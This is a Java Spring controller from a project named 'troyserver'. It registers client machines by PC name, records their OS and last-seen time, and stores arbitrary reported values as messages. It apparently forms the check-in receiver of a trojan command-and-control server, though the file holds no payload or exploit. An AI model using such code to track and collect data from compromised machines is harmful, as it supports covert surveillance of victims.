package ch.lebois.troyserver.controller;

import ch.lebois.troyserver.data.Client;
import ch.lebois.troyserver.data.Message;
import ch.lebois.troyserver.repository.ClientRepository;
import ch.lebois.troyserver.repository.MessageRepository;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;

@Controller
@RequestMapping(value = "reciver/")
public class ReciverController {

    private ClientRepository clientRepository;
    private MessageRepository messageRepository;

    public ReciverController(ClientRepository clientRepository, MessageRepository messageRepository) {
        this.clientRepository = clientRepository;
        this.messageRepository = messageRepository;
    }

    @RequestMapping(value = {"{client}"}, method = RequestMethod.GET)
    public String getInfo(@PathVariable(value = "client") String clientParam,
                          @RequestParam(name = "type", defaultValue = "") String typeParam,
                          @RequestParam(name = "value", defaultValue = "") String valueParam) {

        Client client = clientRepository.findOne(clientParam);
        if (client == null) {
            client = new Client();
            client.setPcName(clientParam);
            clientRepository.save(client);
        }

        switch (typeParam) {
            case "os":
                client.setOs(valueParam);
                break;
            case "online":
                break;
            default:
                Message message = new Message();
                message.setPcNameFk(clientParam);
                message.setType(typeParam);
                message.setText(valueParam);
                messageRepository.save(message);
                break;
        }

        client.setLastseen(new SimpleDateFormat("HH:mm:ss dd.MM").format(Calendar.getInstance().getTime()));
        clientRepository.save(client);

        return "receiver";
    }
}
